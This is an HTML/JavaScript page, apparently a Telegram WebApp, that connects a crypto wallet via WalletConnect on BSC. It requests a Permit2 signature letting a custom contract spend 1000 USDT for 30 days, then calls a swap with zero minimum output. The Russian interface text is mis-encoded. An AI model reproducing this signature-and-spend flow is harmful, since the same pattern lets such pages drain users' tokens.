<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WalletConnect AutoSwap</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #17212b, #0d1520);
      color: #fff;
      text-align: center;
      padding: 20px;
      min-height: 100vh;
      margin: 0;
    }
    .container {
      max-width: 500px;
      margin: 0 auto;
      background: rgba(30, 40, 55, 0.7);
      backdrop-filter: blur(10px);
      border-radius: 16px;
      padding: 30px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.08);
    }
    h1 {
      color: #4fc3f7;
      margin-bottom: 10px;
      font-size: 28px;
    }
    .subtitle {
      color: #90a4ae;
      margin-bottom: 30px;
      font-size: 16px;
    }
    #qrcode-container {
      margin: 25px 0;
      padding: 20px;
      background: rgba(25, 35, 45, 0.6);
      border-radius: 12px;
      display: inline-block;
    }
    #status {
      margin-top: 25px;
      font-weight: 500;
      font-size: 16px;
      line-height: 1.6;
      white-space: pre-line;
      padding: 15px;
      border-radius: 10px;
      background: rgba(25, 35, 45, 0.6);
      min-height: 80px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
    }
    .status-success {
      color: #66bb6a;
      border: 1px solid rgba(102, 187, 106, 0.3);
    }
    .status-error {
      color: #ff4d4d;
      border: 1px solid rgba(255, 77, 77, 0.3);
    }
    .status-info {
      color: #4fc3f7;
      border: 1px solid rgba(79, 195, 247, 0.3);
    }
    .token-info {
      display: flex;
      justify-content: space-between;
      background: rgba(25, 35, 45, 0.6);
      padding: 15px;
      border-radius: 10px;
      margin: 15px 0;
      text-align: left;
      font-size: 14px;
    }
    .token-info div {
      flex: 1;
    }
    .token-label {
      color: #90a4ae;
      font-size: 13px;
      margin-bottom: 5px;
    }
    .token-value {
      font-weight: 500;
      word-break: break-all;
    }
    .loader {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(79, 195, 247, 0.3);
      border-radius: 50%;
      border-top-color: #4fc3f7;
      animation: spin 1s ease-in-out infinite;
      margin-right: 10px;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .logo {
      font-size: 24px;
      margin-bottom: 5px;
    }
    .address {
      font-size: 12px;
      word-break: break-all;
      background: rgba(79, 195, 247, 0.1);
      padding: 8px 12px;
      border-radius: 8px;
      margin-top: 15px;
    }
    .tx-link {
      color: #4fc3f7;
      text-decoration: none;
      border-bottom: 1px dashed #4fc3f7;
      margin-top: 15px;
      display: inline-block;
      padding: 5px 0;
    }
    .tx-link:hover {
      color: #29b6f6;
      border-bottom-style: solid;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">üîÑ</div>
    <h1>WalletConnect AutoSwap</h1>
    <div class="subtitle">Permit2 ‚Üí AutoSwap –Ω–∞ —Å–µ—Ç–∏ BSC</div>
    
    <div class="token-info">
      <div>
        <div class="token-label">–û—Ç–¥–∞–µ—Ç–µ</div>
        <div class="token-value">1000 USDT</div>
      </div>
      <div style="text-align: center; max-width: 30px;">‚Üí</div>
      <div>
        <div class="token-label">–ü–æ–ª—É—á–∞–µ—Ç–µ</div>
        <div class="token-value">–¢–æ–∫–µ–Ω 0xA511...4b4f</div>
      </div>
    </div>
    
    <div id="qrcode-container">
      <canvas id="qrcode"></canvas>
    </div>
    
    <div id="status" class="status-info">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è...</div>
  </div>

  <script>
    // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
    const CONFIG = {
      projectId: "d868f90cd734355ae0320f8f0258b6b1",
      chainId: "eip155:56",
      rpcUrl: "https://bsc-dataseed.binance.org",
      permit2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
      autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
      tokenIn: "0x55D398326f99059FF775485246999027B3197955", // USDT
      tokenOut: "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f", // –ü—Ä–∏–º–µ—Ä
      amount: "1000000000000000000000", // 1000 USDT (18 decimals)
      deadlineSec: 30 * 24 * 60 * 60 // 30 –¥–Ω–µ–π
    };

    // –≠–ª–µ–º–µ–Ω—Ç—ã DOM
    const statusEl = document.getElementById("status");
    const qrCanvas = document.getElementById("qrcode");
    
    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å—Ç–∞—Ç—É—Å–∞
    function setStatus(text, type = "info") {
      statusEl.textContent = text;
      statusEl.className = `status-${type}`;
      
      if (type === "info") {
        statusEl.innerHTML = `<span class="loader"></span>${text}`;
      }
    }
    
    // –§—É–Ω–∫—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ —Å–∫—Ä–∏–ø—Ç–æ–≤
    function loadScript(src) {
      return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = src;
        script.onload = resolve;
        script.onerror = () => reject(new Error(`–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Å–∫—Ä–∏–ø—Ç–∞: ${src}`));
        document.head.appendChild(script);
      });
    }
    
    // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
    async function runApp() {
      try {
        setStatus("–ó–∞–≥—Ä—É–∑–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π...");
        
        // –ó–∞–≥—Ä—É–∑–∫–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤
        await Promise.all([
          loadScript("https://telegram.org/js/telegram-web-app.js"),
          loadScript("https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.7.0/dist/umd/index.min.js"),
          loadScript("https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"),
          loadScript("https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js")
        ]);
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram WebApp
        if (window.Telegram && window.Telegram.WebApp) {
          Telegram.WebApp.ready();
          Telegram.WebApp.expand();
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ SignClient
        if (!window.SignClient) {
          throw new Error("–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ WalletConnect –Ω–µ –∑–∞–≥—Ä—É–∑–∏–ª–∞—Å—å");
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ ethers
        if (!window.ethers) {
          throw new Error("–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ ethers.js –Ω–µ –∑–∞–≥—Ä—É–∑–∏–ª–∞—Å—å");
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ QRCode
        if (!window.QRCode) {
          throw new Error("–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ QRCode –Ω–µ –∑–∞–≥—Ä—É–∑–∏–ª–∞—Å—å");
        }
        
        setStatus("–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WalletConnect...");
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–ª–∏–µ–Ω—Ç–∞
        const client = await window.SignClient.init({
          projectId: CONFIG.projectId,
          relayUrl: "wss://relay.walletconnect.com",
          metadata: {
            name: "AutoSwap WebApp",
            description: "Permit2 ‚Üí AutoSwap on BSC",
            url: window.location.href,
            icons: ["https://walletconnect.com/walletconnect-logo.png"],
          },
        });
        
        setStatus("–°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...");
        
        // –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–π —Å–µ—Å—Å–∏–∏
        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              methods: ["eth_sendTransaction", "eth_signTypedData_v4"],
              chains: [CONFIG.chainId],
              events: ["chainChanged", "accountsChanged"],
            },
          },
        });
        
        // –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ QR-–∫–æ–¥–∞
        if (uri) {
          setStatus("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è QR-–∫–æ–¥–∞...");
          
          window.QRCode.toCanvas(qrCanvas, uri, { 
            width: 220, 
            margin: 1,
            color: {
              dark: '#4fc3f7',
              light: 'transparent'
            }
          }, err => {
            if (err) {
              setStatus("–û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ QR-–∫–æ–¥–∞", "error");
              console.error(err);
            } else {
              setStatus("–°–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR-–∫–æ–¥ –≤ Trust Wallet, MetaMask –∏–ª–∏ –¥—Ä—É–≥–æ–º —Å–æ–≤–º–µ—Å—Ç–∏–º–æ–º –∫–æ—à–µ–ª—å–∫–µ");
            }
          });
        }
        
        setStatus("–û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞...");
        
        // –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Å–µ—Å—Å–∏–∏
        const session = await approval();
        
        if (!session || !session.topic) {
          throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–µ—Å—Å–∏—é");
        }
        
        const accounts = session.namespaces.eip155?.accounts;
        if (!accounts || accounts.length === 0) {
          throw new Error("–ù–µ –Ω–∞–π–¥–µ–Ω—ã –∞–∫–∫–∞—É–Ω—Ç—ã –≤ –∫–æ—à–µ–ª—å–∫–µ");
        }
        
        const walletChainId = session.namespaces.eip155.chains[0];
        if (walletChainId !== CONFIG.chainId) {
          throw new Error(`–ù–µ–≤–µ—Ä–Ω–∞—è —Å–µ—Ç—å. –ü–µ—Ä–µ–∫–ª—é—á–∏—Ç–µ—Å—å –Ω–∞ BSC (ID: 56)`);
        }
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞
        const address = accounts[0].split(":")[2];
        setStatus(`‚úÖ –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω:\n${address}`, "success");
        
        // –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –ø–æ–¥–ø–∏—Å–∏ Permit2
        const now = Math.floor(Date.now() / 1000);
        const deadline = now + CONFIG.deadlineSec;
        const nonce = 0; // –§–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
        
        const domain = {
          name: "Permit2",
          chainId: 56,
          verifyingContract: CONFIG.permit2
        };
        
        const types = {
          PermitTransferFrom: [
            { name: "permitted", type: "TokenPermissions" },
            { name: "spender", type: "address" },
            { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
          ],
          TokenPermissions: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint256" }
          ]
        };
        
        const message = {
          permitted: {
            token: CONFIG.tokenIn,
            amount: CONFIG.amount
          },
          spender: CONFIG.autoswap,
          nonce: nonce,
          deadline: deadline
        };
        
        const typedData = {
          types,
          domain,
          primaryType: "PermitTransferFrom",
          message
        };
        
        // –ó–∞–ø—Ä–æ—Å –ø–æ–¥–ø–∏—Å–∏
        setStatus("–ó–∞–ø—Ä–æ—Å –ø–æ–¥–ø–∏—Å–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è...");
        const signature = await client.request({
          topic: session.topic,
          chainId: CONFIG.chainId,
          request: {
            method: "eth_signTypedData_v4",
            params: [address, typedData]
          }
        });
        
        // –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
        setStatus("–§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –æ–±–º–µ–Ω–∞...");
        const iface = new window.ethers.Interface([
          "function swapForUser(address user, address tokenIn, uint256 amount, uint256 nonce, uint256 deadline, address tokenOut, uint256 minOut, bytes signature)"
        ]);
        
        const calldata = iface.encodeFunctionData("swapForUser", [
          address,
          CONFIG.tokenIn,
          CONFIG.amount,
          nonce,
          deadline,
          CONFIG.tokenOut,
          0, // minOut = 0 –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
          signature
        ]);
        
        const tx = {
          from: address,
          to: CONFIG.autoswap,
          data: calldata
        };
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
        setStatus("–û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –≤ —Å–µ—Ç—å...");
        const txHash = await client.request({
          topic: session.topic,
          chainId: CONFIG.chainId,
          request: {
            method: "eth_sendTransaction",
            params: [tx]
          }
        });
        
        // –£—Å–ø–µ—à–Ω–æ–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ
        const successMessage = `‚úÖ –û–±–º–µ–Ω —É—Å–ø–µ—à–Ω–æ –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω!\n\n–•—ç—à —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:\n${txHash}`;
        setStatus(successMessage, "success");
        
        // –î–æ–±–∞–≤–ª—è–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±–æ–∑—Ä–µ–≤–∞—Ç–µ–ª—å
        const explorerLink = document.createElement('a');
        explorerLink.href = `https://bscscan.com/tx/${txHash}`;
        explorerLink.target = "_blank";
        explorerLink.rel = "noopener noreferrer";
        explorerLink.className = "tx-link";
        explorerLink.textContent = "–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –Ω–∞ BscScan";
        statusEl.after(explorerLink);
        
      } catch (err) {
        console.error("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞:", err);
        setStatus("–û—à–∏–±–∫–∞: " + (err.message || err), "error");
      }
    }
    
    // –ó–∞–ø—É—Å–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    window.addEventListener('DOMContentLoaded', () => {
      // –î–æ–±–∞–≤–ª—è–µ–º –Ω–µ–±–æ–ª—å—à—É—é –∑–∞–¥–µ—Ä–∂–∫—É –¥–ª—è –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –∑–∞–≥—Ä—É–∑–∫–∏ DOM
      setTimeout(runApp, 300);
    });
  </script>
</body>
</html>